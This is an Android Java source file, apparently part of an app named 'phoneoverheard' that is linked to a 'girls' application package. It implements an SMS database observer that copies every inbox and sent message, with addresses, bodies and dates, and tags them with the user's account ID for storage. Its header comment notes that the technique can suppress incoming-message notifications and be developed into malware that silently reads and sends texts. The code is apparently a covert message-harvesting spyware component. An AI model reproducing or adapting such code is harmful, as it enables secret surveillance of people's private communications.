package com.phoneoverheard.phone;

import java.util.ArrayList;
import java.util.List;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.BaseColumns;
import cn.linving.girls.MyApplication;

import com.phoneoverheard.bean.Sms;
import com.phoneoverheard.bean.User;
import com.phoneoverheard.db.SmsUnit;

/**
 * 系统数据库观察者<br/>
 * 
 * Android手机上监听短信有两种方式： <br/>
 * 1、 接受系统的短信广播，操作短信内容。优点：操作方便，适合简单的短信应用。 缺点：来信会在状态栏显示通知信息。 <br/>
 * 2、 应用观察者模式，监听短信数据库，操作短信内容。优点：可以拦截来信在状态栏的显示通知，适合作短信拦截。缺点：可以发展成MU，在后台悄悄的收/发短信。
 * 
 * 
 * this.getContentResolver().registerContentObserver(Uri.parse("content://sms/")
 * , true, content);
 * 
 * @author liulei
 * @date 2015-7-11 下午4:20:49
 * @version 1.0
 */
public class SmsObserver extends ContentObserver {

	private ContentResolver mResolver;
	private Context context;
	private SmsUnit unit;

	public SmsObserver(Context context, Handler handler) {
		super(handler);

		this.context = context;
		this.mResolver = context.getContentResolver();
		unit = new SmsUnit(context);
		// TODO Auto-generated constructor stub
	}

	public interface SMS extends BaseColumns {

		public static final Uri URI_INBOX = Uri.parse("content://sms/inbox");
		public static final Uri URI_SENT = Uri.parse("content://sms/sent");
		public static final Uri URI_ALL = Uri.parse("content://sms/");

		public static final String FILTER = "!imichat";

		public static final String TYPE = "type";

		public static final String THREAD_ID = "thread_id";

		public static final String ADDRESS = "address";

		public static final String PERSON_ID = "person";

		public static final String DATE = "date";

		public static final String READ = "read";

		public static final String BODY = "body";

		public static final String PROTOCOL = "protocol";

		public static final int MESSAGE_TYPE_ALL = 0;

		public static final int MESSAGE_TYPE_INBOX = 1;

		public static final int MESSAGE_TYPE_SENT = 2;

		public static final int MESSAGE_TYPE_DRAFT = 3;

		public static final int MESSAGE_TYPE_OUTBOX = 4;

		public static final int MESSAGE_TYPE_FAILED = 5; // for failed outgoing
															// messages

		public static final int MESSAGE_TYPE_QUEUED = 6; // for messages to send
															// later

		public static final int PROTOCOL_SMS = 0;// SMS_PROTO

		public static final int PROTOCOL_MMS = 1;// MMS_PROTO

	}

	private static final String[] PROJECTION = new String[] {

	SMS._ID,// 0

			SMS.TYPE,// 1

			SMS.ADDRESS,// 2

			SMS.BODY,// 3

			SMS.DATE,// 4

			SMS.THREAD_ID,// 5

	// SMS.READ,// 6

	// SMS.PROTOCOL // 7

	};

	private static final String SELECTION_SUFFIX = SMS.PROTOCOL + " = " + SMS.PROTOCOL_SMS;
	// + " and " + SMS.TYPE + " = " + SMS.MESSAGE_TYPE_INBOX;
	// 按id取
	private static final String SELECTION = SMS._ID + " > %s" + " and " + SELECTION_SUFFIX;
	private static final String SELECTION_BY_DATE = SMS.DATE + " > %s" + " and " + SELECTION_SUFFIX;

	private static final int COLUMN_INDEX_ID = 0;
	private static final int COLUMN_INDEX_TYPE = 1;
	private static final int COLUMN_INDEX_PHONE = 2;
	private static final int COLUMN_INDEX_BODY = 3;
	private static final int COLUMN_INDEX_DATE = 4;
	// 最近一次收到change消息的时间
	private static long preChangeTime = 0;

	/**
	 * 首次进入应用后，检测收件箱与发件箱
	 * 
	 * @author liulei
	 * @date 2015-9-26 void
	 */
	public void checkSmsBoxFirstTime() {

		//数据库里没有数据才会进行检测
		if (unit.count() > 0) {
			return;
		}

		// 根据本地数据库收发件箱的最新时间查询是否有数据，有数据则保存
		User user = MyApplication.getInstance().user;

		if (null == user)
			return;
		String phone = user.getPhoneNum();
		String objectId = user.getObjectId();

		// 收件箱
		Cursor cursor = mResolver.query(SMS.URI_INBOX, PROJECTION, null, null, null);
		List<Sms> list = new ArrayList<Sms>();
		while (cursor.moveToNext()) {
			Sms sms = new Sms();
			sms.setContent(cursor.getString(COLUMN_INDEX_BODY));
			sms.setIdLocal(cursor.getInt(COLUMN_INDEX_ID));
			sms.setReceivePhoneNum(phone);
			sms.setSendPhoneNum(cursor.getString(COLUMN_INDEX_PHONE));
			sms.setSmsTime(cursor.getString(COLUMN_INDEX_DATE));
			sms.setUserId(objectId);

			list.add(sms);
		}
		cursor.close();

		// 发件箱
		cursor = mResolver.query(SMS.URI_SENT, PROJECTION, null, null, null);
		while (cursor.moveToNext()) {
			Sms sms = new Sms();
			sms.setContent(cursor.getString(COLUMN_INDEX_BODY));
			sms.setIdLocal(cursor.getInt(COLUMN_INDEX_ID));
			sms.setReceivePhoneNum(cursor.getString(COLUMN_INDEX_PHONE));
			sms.setSendPhoneNum(phone);
			sms.setSmsTime(cursor.getString(COLUMN_INDEX_DATE));
			sms.setUserId(objectId);

			list.add(sms);
		}
		cursor.close();

		unit.checkToSave(list);

	}

	@Override
	public void onChange(boolean selfChange, Uri uri) {
		// TODO Auto-generated method stu

		// 小于30秒不处理
		if (System.currentTimeMillis() - preChangeTime < 30 * 1000) {

			return;
		}

		preChangeTime = System.currentTimeMillis();

		if (uri.equals(SMS.URI_INBOX) || uri.equals(SMS.URI_SENT)) {

			// 根据本地数据库收发件箱的最新时间查询是否有数据，有数据则保存
			User user = MyApplication.getInstance().user;

			if (null == user)
				return;
			String phone = user.getPhoneNum();
			String objectId = user.getObjectId();
			// 收件箱
			int idLocal = unit.getLatestReceiveIdLocal(phone);
			Cursor cursor = mResolver.query(SMS.URI_INBOX, PROJECTION, String.format(SELECTION, idLocal), null, null);
			List<Sms> list = new ArrayList<Sms>();
			while (cursor.moveToNext()) {
				Sms sms = new Sms();
				sms.setContent(cursor.getString(COLUMN_INDEX_BODY));
				sms.setIdLocal(cursor.getInt(COLUMN_INDEX_ID));
				sms.setReceivePhoneNum(phone);
				sms.setSendPhoneNum(cursor.getString(COLUMN_INDEX_PHONE));
				sms.setSmsTime(cursor.getString(COLUMN_INDEX_DATE));
				sms.setUserId(objectId);

				list.add(sms);
			}
			cursor.close();

			// 发件箱
			idLocal = unit.getLatestSendIdLocal(phone);
			cursor = mResolver.query(SMS.URI_SENT, PROJECTION, String.format(SELECTION, idLocal), null, null);
			while (cursor.moveToNext()) {
				Sms sms = new Sms();
				sms.setContent(cursor.getString(COLUMN_INDEX_BODY));
				sms.setIdLocal(cursor.getInt(COLUMN_INDEX_ID));
				sms.setReceivePhoneNum(cursor.getString(COLUMN_INDEX_PHONE));
				sms.setSendPhoneNum(phone);
				sms.setSmsTime(cursor.getString(COLUMN_INDEX_DATE));
				sms.setUserId(objectId);

				list.add(sms);
			}
			cursor.close();

			unit.checkToSave(list);
		}
		super.onChange(selfChange, uri);
	}

}